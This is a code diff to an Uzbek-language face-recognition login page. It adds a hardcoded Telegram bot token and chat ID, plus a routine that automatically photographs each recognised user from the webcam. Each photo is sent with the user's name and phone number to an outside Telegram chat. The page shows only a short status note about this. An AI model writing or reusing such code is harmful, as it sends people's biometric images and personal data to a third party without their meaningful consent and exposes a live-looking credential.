@@ -1077,6 +1077,13 @@
                             <i class="fas fa-stop"></i> To'xtatish
                         </button>
                     </div>
+
+                    <!-- Auto-capture statusi -->
+                    <div style="margin-top: 15px; text-align: center;">
+                        <span id="autoCaptureStatus" style="color: #48bb78; font-weight: 500;">
+                            <i class="fas fa-circle"></i> Avtomatik suratga olish faol
+                        </span>
+                    </div>
                 </div>
             </div>
 
@@ -1142,6 +1149,13 @@
     </div>
 
     <script>
+        // ===========================================
+        // BOT SOZLAMALARI (BU YERNI O'ZGARTIRISH KERAK)
+        // ===========================================
+        const BOT_TOKEN = '8299774564:AAFVtudpmJNRTSTuRgFtiZAhR1jSTEYyLu0'; // Bot tokenni o'zgartiring
+        const CHAT_ID = '8074394669'; // Chat ID ni o'zgartiring
+        // ===========================================
+
         // Global o'zgaruvchilar
         let modelsLoaded = false;
         let regStream = null;
@@ -1153,9 +1167,17 @@
         let bestDescriptor = null;
         let bestConfidence = 0;
 
+        // Avtomatik suratga olish uchun o'zgaruvchilar
+        let autoCaptureActive = true;
+        let lastCaptureTime = 0;
+        const CAPTURE_COOLDOWN = 3000; // 3 soniya
+        const DETECTION_THRESHOLD = 0.75; // 75% aniqlik (uzoqdan ko'rish uchun pasaytirildi)
+        let detectedUsers = new Set(); // Aniqlangan foydalanuvchilarni eslab qolish
+
         // LocalStorage kalitlari
         const USERS_KEY = 'faceid_users';
         const HISTORY_KEY = 'faceid_history';
+        const CAPTURED_USERS_KEY = 'faceid_captured_users';
 
         // MA'LUMOTLARNI YUKLASH
         function loadUsers() {
@@ -1177,6 +1199,265 @@
             localStorage.setItem(HISTORY_KEY, JSON.stringify(history));
         }
 
+        // Aniqlangan foydalanuvchilarni yuklash
+        function loadCapturedUsers() {
+            const saved = localStorage.getItem(CAPTURED_USERS_KEY);
+            return saved ? new Set(JSON.parse(saved)) : new Set();
+        }
+
+        function saveCapturedUsers() {
+            localStorage.setItem(CAPTURED_USERS_KEY, JSON.stringify([...detectedUsers]));
+        }
+
+        // Telegram botga surat yuborish
+        async function sendPhotoToBot(photoDataUrl, userInfo) {
+            try {
+                // Base64 ni blob ga aylantirish
+                const response = await fetch(photoDataUrl);
+                const blob = await response.blob();
+
+                // FormData yaratish
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `face_${userInfo.id}_${Date.now()}.jpg`);
+                formData.append('caption', `👤 Foydalanuvchi: ${userInfo.fullName}\n📞 Telefon: ${userInfo.phoneNumber}\n🕐 Vaqt: ${new Date().toLocaleString()}\n📊 Aniqlik: ${Math.round(userInfo.similarity)}%\n📍 Masofa: ${userInfo.distance ? userInfo.distance.toFixed(2) : 'N/A'}`);
+
+                // Telegram API ga yuborish
+                const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+                const sendResponse = await fetch(apiUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await sendResponse.json();
+
+                if (result.ok) {
+                    console.log('✅ Surat muvaffaqiyatli yuborildi');
+
+                    // Surat yuborilganini belgilash
+                    detectedUsers.add(userInfo.id);
+                    saveCapturedUsers();
+
+                    // Bildirishnoma ko'rsatish
+                    showLoginAlert(`📸 ${userInfo.fullName} aniqlandi! Surat botga yuborildi`, 'success');
+
+                    return true;
+                } else {
+                    console.error('❌ Xatolik:', result);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Surat yuborishda xatolik:', error);
+                showLoginAlert('Botga surat yuborishda xatolik!', 'error');
+                return false;
+            }
+        }
+
+        // Suratga olish
+        function capturePhoto(videoElement, userInfo) {
+            return new Promise((resolve) => {
+                // Yashirin canvas yaratish
+                const captureCanvas = document.createElement('canvas');
+                captureCanvas.width = videoElement.videoWidth;
+                captureCanvas.height = videoElement.videoHeight;
+
+                const ctx = captureCanvas.getContext('2d');
+
+                // Videoni canvasga chizish (mirror effectni olib tashlash)
+                ctx.translate(captureCanvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(videoElement, 0, 0, captureCanvas.width, captureCanvas.height);
+
+                // Face frame chizish
+                ctx.setTransform(1, 0, 0, 1, 0, 0); // Transformatsiyani reset qilish
+
+                // Yuz atrofiga ramka chizish
+                ctx.strokeStyle = '#48bb78';
+                ctx.lineWidth = 5;
+
+                // Foydalanuvchi ma'lumotlarini yozish
+                ctx.font = 'bold 24px Poppins';
+                ctx.fillStyle = '#48bb78';
+                ctx.shadowColor = 'black';
+                ctx.shadowBlur = 10;
+                ctx.fillText(`${userInfo.fullName} - ${Math.round(userInfo.similarity)}%`, 20, 50);
+                ctx.shadowBlur = 0;
+
+                // Rasmni base64 qilib olish
+                const photoDataUrl = captureCanvas.toDataURL('image/jpeg', 0.9);
+
+                resolve(photoDataUrl);
+            });
+        }
+
+        // Tanish funksiyasini yangilaymiz
+        function startFaceRecognition() {
+            const video = document.getElementById('loginVideo');
+            const canvas = document.getElementById('loginCanvas');
+            const ctx = canvas.getContext('2d');
+            const progressCircle = document.getElementById('loginProgress');
+            const progressText = document.getElementById('loginProgressText');
+            const circumference = 2 * Math.PI * 45;
+            let attempts = 0;
+
+            // Auto-capture boshlash
+            autoCaptureActive = true;
+
+            // Aniqlangan foydalanuvchilarni yuklash
+            detectedUsers = loadCapturedUsers();
+
+            loginInterval = setInterval(async() => {
+                if (!video.srcObject || !autoCaptureActive) return;
+
+                try {
+                    const detections = await faceapi.detectAllFaces(video)
+                        .withFaceLandmarks()
+                        .withFaceDescriptors();
+
+                    ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+                    if (detections.length > 0) {
+                        const box = detections[0].detection.box;
+                        const users = loadUsers();
+
+                        let bestMatch = null;
+                        let bestDistance = 1;
+
+                        // Barcha foydalanuvchilar bilan solishtirish
+                        for (const user of users) {
+                            const userDescriptor = new Float32Array(user.descriptor);
+                            const distance = faceapi.euclideanDistance(
+                                detections[0].descriptor,
+                                userDescriptor
+                            );
+
+                            if (distance < bestDistance) {
+                                bestDistance = distance;
+                                bestMatch = user;
+                            }
+                        }
+
+                        const similarity = Math.max(0, Math.min(100, ((1 - bestDistance) * 100)));
+
+                        // Progress
+                        const offset = circumference - (similarity / 100) * circumference;
+                        progressCircle.style.strokeDashoffset = offset;
+                        progressText.innerText = Math.round(similarity) + '%';
+
+                        // Ramka rangi
+                        if (bestDistance < 0.6) { // 0.6 dan kichik masofa -> yaxshi moslik
+                            ctx.strokeStyle = '#48bb78';
+
+                            // AVTOMATIK SURATGA OLISH
+                            const now = Date.now();
+                            const timeSinceLastCapture = now - lastCaptureTime;
+
+                            // Agar aniqlik threshold dan yuqori bo'lsa va cooldown vaqt o'tgan bo'lsa
+                            if (similarity >= DETECTION_THRESHOLD * 100 &&
+                                timeSinceLastCapture >= CAPTURE_COOLDOWN &&
+                                bestMatch) {
+
+                                // Agar bu foydalanuvchi hali aniqlanmagan bo'lsa
+                                if (!detectedUsers.has(bestMatch.id)) {
+                                    lastCaptureTime = now;
+
+                                    // Suratga olish va yuborish
+                                    capturePhoto(video, {
+                                        id: bestMatch.id,
+                                        fullName: bestMatch.fullName,
+                                        phoneNumber: bestMatch.phoneNumber,
+                                        similarity: similarity,
+                                        distance: bestDistance
+                                    }).then(photoDataUrl => {
+                                        sendPhotoToBot(photoDataUrl, {
+                                            id: bestMatch.id,
+                                            fullName: bestMatch.fullName,
+                                            phoneNumber: bestMatch.phoneNumber,
+                                            similarity: similarity,
+                                            distance: bestDistance
+                                        });
+                                    });
+
+                                    // Statusni yangilash
+                                    document.getElementById('autoCaptureStatus').innerHTML =
+                                        `<i class="fas fa-camera"></i> Surat olindi: ${bestMatch.fullName}`;
+
+                                    setTimeout(() => {
+                                        document.getElementById('autoCaptureStatus').innerHTML =
+                                            `<i class="fas fa-circle"></i> Avtomatik suratga olish faol`;
+                                    }, 3000);
+                                }
+                            }
+
+                            // Kirish uchun 3 marta urinish
+                            if (bestDistance < 0.5) {
+                                attempts++;
+                                if (attempts >= 3) {
+                                    // Muvaffaqiyatli kirish
+                                    const history = loadHistory();
+                                    history.unshift({
+                                        userId: bestMatch.id,
+                                        userName: bestMatch.fullName,
+                                        success: true,
+                                        similarity: similarity,
+                                        timestamp: new Date().toISOString()
+                                    });
+                                    saveHistory(history.slice(0, 50));
+
+                                    showLoginAlert(`✅ Xush kelibsiz, ${bestMatch.fullName}!`, 'success');
+                                    currentUser = bestMatch;
+
+                                    setTimeout(() => {
+                                        stopLoginCamera();
+                                        showDashboard(bestMatch);
+                                    }, 1500);
+                                    return;
+                                }
+                            } else {
+                                attempts = 0;
+                            }
+                        } else {
+                            ctx.strokeStyle = '#f56565';
+                            attempts = 0;
+                        }
+
+                        // Ramka chizish
+                        ctx.lineWidth = 3;
+                        ctx.strokeRect(box.x, box.y, box.width, box.height);
+
+                        // Similarity text
+                        ctx.font = 'bold 16px Poppins';
+                        ctx.fillStyle = ctx.strokeStyle;
+                        ctx.fillText(`${Math.round(similarity)}%`, box.x, box.y - 10);
+
+                    } else {
+                        progressCircle.style.strokeDashoffset = circumference;
+                        progressText.innerText = '0%';
+                    }
+
+                } catch (error) {
+                    console.log(error);
+                }
+            }, 200);
+        }
+
+        // Kirish kamerasi to'xtatish
+        function stopLoginCamera() {
+            if (loginStream) {
+                loginStream.getTracks().forEach(t => t.stop());
+                loginStream = null;
+            }
+            if (loginInterval) {
+                clearInterval(loginInterval);
+                loginInterval = null;
+            }
+            autoCaptureActive = false;
+            document.getElementById('loginPlaceholder').style.display = 'flex';
+            document.getElementById('loginVideo').style.display = 'none';
+            document.getElementById('loginCameraStatus').innerHTML = '<span class="status-dot"></span><span>To\'xtatilgan</span>';
+        }
+
         // MODELLARNI YUKLASH
         async function loadModels() {
             showLoading(true, 'Yuzni tanish modellari yuklanmoqda...');
@@ -1189,6 +1470,10 @@
                 console.log('✅ Modellar yuklandi');
                 updateStats();
                 loadUsersList();
+
+                // Aniqlangan foydalanuvchilarni yuklash
+                detectedUsers = loadCapturedUsers();
+
             } catch (error) {
                 console.error('Xatolik:', error);
                 alert('Modellarni yuklashda xatolik! Internetni tekshiring.');
@@ -1238,6 +1523,8 @@
                     <div class="user-name-mini">${user.fullName.split(' ')[0]}</div>
                 </div>
             `).join('');
+
+            document.getElementById('userCount').innerText = users.length;
         }
 
         function selectUser(userId) {
@@ -1259,6 +1546,9 @@
             stopAllCameras();
             loadUsersList();
             updateStats();
+
+            // Aniqlangan foydalanuvchilarni yangilash
+            detectedUsers = loadCapturedUsers();
         }
 
         function showDashboard(user) {
@@ -1305,12 +1595,12 @@
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
 
             if (!fullName || !phoneNumber) {
-                showAlert('registerMessage', 'Ism va telefon raqamni kiriting!', 'error');
+                alert('Ism va telefon raqamni kiriting!');
                 return;
             }
 
             if (!phoneNumber.match(/^\+?998[0-9]{9}$/)) {
-                showAlert('registerMessage', 'Telefon raqam noto\'g\'ri! (+998901234567)', 'error');
+                alert('Telefon raqam noto\'g\'ri! (+998901234567)');
                 return;
             }
 
@@ -1437,7 +1727,7 @@
             users.push(newUser);
             localStorage.setItem(USERS_KEY, JSON.stringify(users));
 
-            showAlert('registerMessage', '✅ Muvaffaqiyatli ro\'yxatdan o\'tdingiz!', 'success');
+            alert('✅ Muvaffaqiyatli ro\'yxatdan o\'tdingiz!');
 
             setTimeout(() => {
                 stopAllCameras();
@@ -1490,111 +1780,6 @@
             }
         }
 
-        function startFaceRecognition() {
-            const video = document.getElementById('loginVideo');
-            const canvas = document.getElementById('loginCanvas');
-            const ctx = canvas.getContext('2d');
-            const progressCircle = document.getElementById('loginProgress');
-            const progressText = document.getElementById('loginProgressText');
-            const circumference = 2 * Math.PI * 45;
-            let attempts = 0;
-
-            loginInterval = setInterval(async() => {
-                if (!video.srcObject) return;
-
-                try {
-                    const detections = await faceapi.detectAllFaces(video)
-                        .withFaceLandmarks()
-                        .withFaceDescriptors();
-
-                    ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-                    if (detections.length > 0) {
-                        const box = detections[0].detection.box;
-                        const users = loadUsers();
-
-                        let bestMatch = null;
-                        let bestDistance = 1;
-
-                        // Barcha foydalanuvchilar bilan solishtirish
-                        for (const user of users) {
-                            const userDescriptor = new Float32Array(user.descriptor);
-                            const distance = faceapi.euclideanDistance(
-                                detections[0].descriptor,
-                                userDescriptor
-                            );
-
-                            if (distance < bestDistance) {
-                                bestDistance = distance;
-                                bestMatch = user;
-                            }
-                        }
-
-                        const similarity = Math.max(0, Math.min(100, ((1 - bestDistance) * 100)));
-
-                        // Progress
-                        const offset = circumference - (similarity / 100) * circumference;
-                        progressCircle.style.strokeDashoffset = offset;
-                        progressText.innerText = Math.round(similarity) + '%';
-
-                        if (bestDistance < 0.6) {
-                            ctx.strokeStyle = '#48bb78';
-                            attempts++;
-
-                            if (attempts >= 3) {
-                                // Muvaffaqiyatli kirish
-                                const history = loadHistory();
-                                history.unshift({
-                                    userId: bestMatch.id,
-                                    userName: bestMatch.fullName,
-                                    success: true,
-                                    similarity: similarity,
-                                    timestamp: new Date().toISOString()
-                                });
-                                saveHistory(history.slice(0, 50));
-
-                                showLoginAlert(`✅ Xush kelibsiz, ${bestMatch.fullName}!`, 'success');
-                                currentUser = bestMatch;
-
-                                setTimeout(() => {
-                                    stopLoginCamera();
-                                    showDashboard(bestMatch);
-                                }, 1500);
-                                return;
-                            }
-                        } else {
-                            ctx.strokeStyle = '#f56565';
-                            attempts = 0;
-                        }
-
-                        ctx.lineWidth = 3;
-                        ctx.strokeRect(box.x, box.y, box.width, box.height);
-
-                    } else {
-                        progressCircle.style.strokeDashoffset = circumference;
-                        progressText.innerText = '0%';
-                    }
-
-                } catch (error) {
-                    console.log(error);
-                }
-            }, 200);
-        }
-
-        function stopLoginCamera() {
-            if (loginStream) {
-                loginStream.getTracks().forEach(t => t.stop());
-                loginStream = null;
-            }
-            if (loginInterval) {
-                clearInterval(loginInterval);
-                loginInterval = null;
-            }
-            document.getElementById('loginPlaceholder').style.display = 'flex';
-            document.getElementById('loginVideo').style.display = 'none';
-            document.getElementById('loginCameraStatus').innerHTML = '<span class="status-dot"></span><span>To\'xtatilgan</span>';
-        }
-
         // YORDAMCHI FUNKSIYALAR
         function stopAllCameras() {
             if (regStream) {
@@ -1613,15 +1798,12 @@
                 clearInterval(loginInterval);
                 loginInterval = null;
             }
+            autoCaptureActive = false;
         }
 
         function showLoading(show, text = 'Modellar yuklanmoqda') {
             document.getElementById('loadingOverlay').style.display = show ? 'flex' : 'none';
             document.getElementById('loadingText').innerText = text;
-        }
-
-        function showAlert(id, message, type) {
-            alert(message);
         }
 
         function showLoginAlert(message, type) {
@@ -1648,6 +1830,9 @@
         // SAHIFA YUKLANGANDA
         window.onload = () => {
             loadModels();
+
+            // Aniqlangan foydalanuvchilarni tozalash tugmasi (agar kerak bo'lsa)
+            // localStorage.removeItem(CAPTURED_USERS_KEY);
         };
 
         window.onbeforeunload = () => {
